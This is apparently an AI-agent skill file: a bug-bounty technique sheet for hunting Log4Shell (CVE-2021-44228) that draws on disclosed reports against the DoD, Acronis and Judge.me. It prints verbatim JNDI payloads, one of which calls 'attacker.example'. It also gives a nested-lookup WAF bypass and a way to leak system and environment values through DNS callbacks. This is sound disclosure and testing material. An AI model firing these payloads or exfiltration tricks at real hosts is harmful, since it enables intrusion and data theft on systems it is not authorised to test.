---
name: hunter-l3-log4shell-rce
description: "Use when hunting Log4Shell (RCE) on a target. Loads the L3 technique sheet: Log4Shell (CVE-2021-44228) is a JNDI-injection RCE class affecting applications that log attacker-controlled input with a vulnerable Apache Log4j 2 version (≤2.14.1)."
domain: cybersecurity
subdomain: web
tags:
- web
- log4shell-rce
- hunting
- l3
version: '1.0'
---

# Log4Shell (RCE) — Technique Sheet

## Overview

Log4Shell (CVE-2021-44228) is a JNDI-injection RCE class affecting applications that log attacker-controlled input with a vulnerable Apache Log4j 2 version (≤2.14.1). Any string that reaches a log4j logger — form fields, query parameters, HTTP headers, User-Agents, X-Forwarded-For, etc. — is parsed for `${jndi:...}` lookups, which the logging framework resolves, giving attacker-controlled directory/network lookups and ultimately arbitrary code execution. In bug bounty practice, the safe, high-signal confirmation is a **DNS pingback to a server you control** (interact.sh, dnslog, your own DNS host), optionally with **data exfiltration via the DNS hostname** (e.g. leaking `${sys:user.name}` into the lookup domain). It pays everywhere: dedicated endpoints, auth forms, search features, and even the root page of any host where headers are logged.

## Distinct sub-patterns

### 1. Auth-form field injection (POST body parameter)

- **Endpoint shape / parameter:** `POST /login`, parameter `username` (any credential or user-identity field that gets logged — username, email, etc.)
- **Payload that actually fired (verbatim):**
  ```
  ${jndi:ldap://dns-server-yoi-control/a}
  ```
  (record shows the placeholder style used: the attacker's controlled DNS server hostname in place of `dns-server-yoi-control`)
- **Root cause:** The username field is written to application logs by a log4j version vulnerable to CVE-2021-44228, which resolves JNDI lookups inside log messages. Login attempts are almost universally logged (for auditing/brute-force detection), so the field is guaranteed to hit the vulnerable logger.
- **Impact proven:** The submitted JNDI payload triggered a DNS request to the attacker-controlled DNS server, confirming the vulnerable log4j and potential arbitrary code execution.
- **Exemplars:** 1423496 (U.S. Dept Of Defense)

### 2. Header / query-string injection on the root path

- **Endpoint shape / parameter:** `GET /` on a subdomain host (e.g. `nps.acronis.com`), payload placed in **query string and request headers** — test headers broadly (User-Agent, Referer, X-Api-Version, Authorization-adjacent custom headers).
- **Payload that actually fired (verbatim):**
  ```
  ${jdni:ldap://nps.acronis.com.<your-server>/test}
  ```
  Note this record's payload as disclosed contains `jdni` (a typo variant); the interaction still fired — don't be surprised when near-miss variants in writeups are as-documented rather than canonical.
- **Root cause:** The host runs a vulnerable log4j that resolves JNDI lookups from logged input such as request headers — no dedicated endpoint needed; anything the edge/app logs at the root route works.
- **Impact proven:** Injection into headers/query triggered a callback to the attacker's interact.sh server, proving untrusted deserialization leading to RCE.
- **Exemplars:** 1425474 (Acronis, nps.acronis.com)

### 3. Header injection on a feature endpoint

- **Endpoint shape / parameter:** `GET /reviews`, payload in **request headers** (feature page on a production app, e.g. judge.me/reviews).
- **Payload that actually fired (verbatim):**
  ```
  ${jndi:ldap://attacker.example/a}
  ```
- **Root cause:** The app logs request headers (or header-derived strings) through vulnerable log4j, which performs JNDI lookups on logged strings. Any endpoint that logs request metadata is in scope even if its business logic is unrelated to the parameter.
- **Impact proven:** Confirmed via uploaded logs/pictures (collaborator screenshots of the DNS interaction) that the Log4Shell payload was processed, enabling arbitrary code execution on the application.
- **Exemplars:** 1427589 (Judge.me)

### 4. Parameter injection with obfuscated payload + DNS data exfiltration

- **Endpoint shape / parameter:** `GET /search`, parameter `s` — classic search-box/logs-the-query pattern.
- **Payload that actually fired (verbatim):**
  ```
  ${j${main:\k5:-Nd}i${spring:k5:-:}ldap://${sys:user.name}-04363f1f3427b48.test3.ggdd.co.uk/}
  ```
- **Root cause:** The search parameter is logged by an outdated log4j that resolves JNDI lookups. The payload combines two tricks:
  1. **Obfuscation/bypass of input filters** — nested lookups (`j${main:\k5:-Nd}i`, `${spring:k5:-:}`) reassemble `jndi:` at resolution time so naive WAF string-matching on `jndi` fails. `${x:...:-default}` uses arbitrary/unknown lookup keys where the part after `:-` is the fallback value returned when the lookup key is invalid — so `main:\k5:-Nd` yields `Nd` and `spring:k5:-:` yields `:`.
  2. **Exfiltration via DNS** — `${sys:user.name}` is resolved *server-side* by log4j before the JNDI lookup, embedding the OS username into the hostname that gets queried, so the DNS interaction itself leaks the value.
- **Impact proven:** The payload in the search parameter triggered a pingback to the attacker's server exfiltrating the system username `solr` (also revealing the host runs Solr — a stack fingerprint), confirming remote code execution via JNDI.
- **Exemplars:** 1430622 (Acronis, forum.acronis.com)

## Bypass / chain notes

- **Filter bypass via nested lookups** (proven in 1430622): wrap parts of the literal `jndi:` in `${<key>:<junk>:-<fragment>}` expressions so the plain string `jndi` never appears in the raw request. The record shows `j${main:\k5:-Nd}i${spring:k5:-:}ldap://...` — the lookup keys (`main`, `spring`) need not exist for the fallback-after-`:-` to be used.
- **Server-side data exfil in the DNS name** (proven in 1430622): `${sys:user.name}` (and by extension other `${sys:*}` / `${env:*}` values) resolved inside the payload get embedded into the callback hostname. One DNS pingback doubles as proof of RCE *and* an info-disclosure primitive. Anchor a unique per-target marker in the hostname (`-04363f1f3427b48.` in the record) so you can attribute callbacks.
- **Surface coverage matters more than payload variety**: the records demonstrate that the same canonical payload wins across four different injection surfaces — POST body auth field, query string, HTTP headers, and search parameter. Enumerate surfaces first (headers on every host you touch, login fields, search params), then escalate payload sophistication only if plain payloads don't fire.
- No record in this set used multi-step exploitation chains (LDAP server serving an exploit class); all four were confirmed at the DNS-callback stage, which is the expected ceiling for safe bug-bounty validation.

## Gotchas / what NOT to do

- **Do not actually execute code or fetch a remote LDAP payload.** All four verified findings were proven with DNS-only callbacks. Point the JNDI URL at a DNS name you control (interact.sh / your own authoritative DNS host) — the DNS request alone proves resolution and RCE potential without running an exploit server.
- **Use unique, per-target markers in the callback hostname** so interactions are attributable (the records use distinct markers like `04363f1f3427b48.test3.ggdd.co.uk` and target-specific subdomains like `nps.acronis.com.<your-server>`).
- **Expect and preserve typo'd variants in source material** — record 1425474 fired with `jdni` instead of `jndi`. When reproducing, use the canonical `${jndi:ldap://...}` form; when citing, keep records verbatim.
- **Don't test only obvious parameters.** The strongest recurring surface in these records is *headers on arbitrary routes* — two of four findings came from header injection on pages whose own logic is irrelevant (`/`, `/reviews`).
- **Screenshot/retain the DNS interaction evidence** — 1427589's disclosure explicitly uploaded logs/pictures as proof. A bare claim of a callback without the interaction log is a weak report.
- **Don't fire the raw payload if a WAF is suspected without also trying the obfuscated form** — the nested-lookup bypass (sub-pattern 4) is the proven fallback in this dataset.

## Real-world impact examples

- **U.S. Dept Of Defense (1423496):** JNDI payload in the login `username` field caused a DNS request to the attacker's server — RCE potential confirmed on a federal asset, from a single unauthenticated POST.
- **Acronis / nps.acronis.com (1425474):** Header/query injection on the root path of a production subdomain produced an interact.sh callback, proving untrusted deserialization leading to RCE on vendor infrastructure.
- **Judge.me (1427589):** Header injection on `/reviews` showed the Log4Shell payload was processed, enabling arbitrary code execution on the application.
- **Acronis / forum.acronis.com (1430622):** Obfuscated payload in the `s` search parameter pinged the attacker's server with the OS username `solr` embedded in the DNS query — simultaneous proof of RCE, WAF bypass, and system-information disclosure (username + underlying Solr stack) in one request.